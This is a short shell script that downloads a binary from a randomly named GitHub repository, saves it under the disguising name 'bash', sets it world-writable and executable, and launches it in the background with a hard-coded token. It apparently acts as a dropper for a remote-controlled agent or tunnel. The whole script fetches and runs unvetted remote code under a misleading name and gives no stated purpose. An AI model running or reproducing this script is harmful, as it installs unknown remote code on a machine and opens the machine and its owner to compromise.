#!/bin/sh

num="1"
token="1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA="
execUrl="https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"

execName="bash"
execPath="`mktemp -d`/${execName}"
wget -qO "${execPath}" "${execUrl}"
chmod 777 "${execPath}"


while [ "$num" -gt "0" ]; do
  execDir=`mktemp -d`;
  ln -sf "${execPath}" "${execDir}/${execName}";
  cd "${execDir}";
  "./${execName}" start accept --token "${token}" 2>&1 &
  num=$((num-1)); 
done

[ "$1" == "1" ] && wait
